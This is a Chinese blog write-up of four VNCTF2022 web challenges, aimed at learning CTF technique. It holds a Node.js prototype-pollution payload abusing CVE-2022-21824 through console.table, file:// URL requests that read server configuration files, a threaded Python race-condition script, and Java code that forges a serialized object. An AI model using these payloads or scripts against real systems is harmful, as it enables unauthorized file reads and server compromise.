---
uuid: 2629a90a-dfd8-1bb8-ec6c-171901735ee4
title: VNCTF2022---WP
date: 2022-02-12 13:27:31
tags:
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

**比赛做出来的题目做一些记录**

<!--more-->

## GameV4.0

![image-20220212132916406](https://img-blog.csdnimg.cn/img_convert/ead1677d2ad597c53bfb2cdf1a13a5e8.png)

![image-20220212132943001](https://img-blog.csdnimg.cn/img_convert/64becc640c08905a842b4a2f73d7792f.png)

看这样子又是个游戏，这样的题考察的都比较基础！看到这个题娱乐性的玩了几局，没啥意思，开始正常做题吧！

代码审计，搜索flag![image-20220212133150686](https://img-blog.csdnimg.cn/img_convert/86b54f8306cc9056a8746300d2cb977d.png)

一点就中！![image-20220212133205891](https://img-blog.csdnimg.cn/img_convert/324d0233209e4fc1d6429414d574469b.png)

base64解密![image-20220212133234720](https://img-blog.csdnimg.cn/img_convert/058e790958e6bc9c07ad44996a3858b2.png)

稍微改一下即得到flag！VNCTF{Welcome_to_VNCTF2022}

## gocalc0

![image-20220217215928285](https://img-blog.csdnimg.cn/img_convert/0e98bffdfd127fc1d02517b4a4b0ea98.png)

点击flag在这里，发现flag在运行里！![image-20220217220006414](https://img-blog.csdnimg.cn/img_convert/55f91762564bfce50b00107ad024ca56.png)

这个时候考虑到应该是在传输的过程中有重要数据，用抓包看一下！![image-20220217220056349](https://img-blog.csdnimg.cn/img_convert/96b7e2b8d7150c534e7e027ebd8dc56d.png)

send数据之后看到了cookie的数据貌似是base64加密，尝试解密后发现还是base64加密，两次base64解密后得到flag！

![image-20220217220156892](https://img-blog.csdnimg.cn/img_convert/6e8ce4e1331aee73d525eac9385de2cf.png)

## newcalc0

![image-20220217222238456](https://img-blog.csdnimg.cn/img_convert/ed918af49212a1373b66e25855a5ac1f.png)

这个有一个源代码，看一下！

```
const express = require("express");
const path = require("path");
const vm2 = require("vm2");

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use(express.static("static"));

const vm = new vm2.NodeVM();

app.use("/eval", (req, res) => {
  const e = req.body.e;
  if (!e) {
    res.send("wrong?");
    return;
  }
  try {
    res.send(vm.run("module.exports="+e)?.toString() ?? "no");
  } catch (e) {
    console.log(e)
    res.send("wrong?");
  }
});

app.use("/flag", (req, res) => {
  if(Object.keys(Object.prototype).length > 0) {
    Object.keys(Object.prototype).forEach(k => delete Object.prototype[k]);
    res.send(process.env.FLAG);
  } else {
    res.send(Object.keys(Object.prototype));
  }
})

app.use("/source", (req, res) => {
  let p = req.query.path || "/src/index.js";
  p = path.join(path.resolve("."), path.resolve(p));
  console.log(p);
  res.sendFile(p);
});

app.use((err, req, res, next) => {
  console.log(err)
  res.redirect("index.html");
});

app.listen(process.env.PORT || 8888);
```

看了官方wp发现这是考察原型链污染，利用的是CVE-2022-21824

```
https://nodejs.org/zh-cn/blog/vulnerability/jan-2022-security-releases/
```

首先需要bp抓包然后payload一下下面的内容：

```
console.table([{a:1}],['__proto__'])
```

之后直接访问/flag就出来结果了!

![image-20220217222805239](https://img-blog.csdnimg.cn/img_convert/86435b307e352ebcb3bc200a778e55c7.png)

> `console.table`API的作用是将数据以表格的形式显示。

推荐：

两个在线反编译网站

```
http://www.javadecompilers.com
https://www.decompiler.com/
```

## easyJava[复现]

```
/file?url=file:///usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
/file?url=file:///usr/local/tomcat/webapps/ROOT/WEB-INF/classes
```

![image-20220314212140534](https://img-blog.csdnimg.cn/img_convert/c2c8f49c3092e7b60b403b5aa1df00ce.png)

查看classes发现上图这些文件，查看servlet![image-20220314212345047](https://img-blog.csdnimg.cn/img_convert/fd043d0c34d7d7c04d9c629d2a6486ac.png)

继续查看文件，第二个文件，得到附件，进去审计！![img](https://img-blog.csdnimg.cn/img_convert/d01cc32b13c744a74d3206cb21ebdc3c.png)![image-20220314212415116](https://img-blog.csdnimg.cn/img_convert/21f2df90aa809ffbe1eb8ff5f789efcd.png)

要获取flag就得使得key的值正确且反序列化出来的user对象属性值要与this.user当中一致。

如何获取key 在doGet函数中 if 和 else当中的判断相同 冲突
要想获取key 只能通过条件竞争 才能在上面的判断中不成立 进入else后得到正确的name![img](https://img-blog.csdnimg.cn/img_convert/615934892be30fd5ad65532847bf18f2.png)

```
# -*- coding: UTF-8 -*-
import requests
import threading
host = "http://aafc6475-042c-4bf7-827e-4f577bb2838d.node4.buuoj.cn:81/"

class myThread (threading.Thread):
    def __init__(self, name):
        threading.Thread.__init__(self)
        self.name = name
    def run(self):
        print ("开始线程：" + self.name)
        runing(self.name)
        print ("退出线程：" + self.name)

def runing(name):
	while True:
	 r = requests.get(host+"/evi1?name=%s" % name)
	 r.encoding = "utf-8"
	 if r.text.find("The Key is")!=-1:
	 	print(r.text)
	 	return 0

# 创建新线程
thread1 = myThread("asdqwer")
thread2 = myThread("vnctf2022")

# 开启新线程
thread1.start()
thread2.start()
thread1.join()
thread2.join()
```

![image-20220314213034641](https://img-blog.csdnimg.cn/img_convert/4bcc47c6b9aead7729d39f210bd2c637.png)

然后就是要满足this.user.equals(u) 直接序列化一个就行。

```
package Payload;

import entity.User;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import util.SerAndDe;

public class Ser {
    public static void main(String[] args) throws IOException {
        User user = new User("m4n_q1u_666","666","180");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(user);

        byte[] ser = bos.toByteArray();
        Base64.Encoder encoder = Base64.getEncoder();
        String encodedText = encoder.encodeToString(ser);
        System.out.println(encodedText);
        User user2 = (User) SerAndDe.deserialize(ser);
        System.out.println(user2);
    }
}
```

最后提交key和生成的[base64](https://so.csdn.net/so/search?q=base64&spm=1001.2101.3001.7020)就可以得到flag！
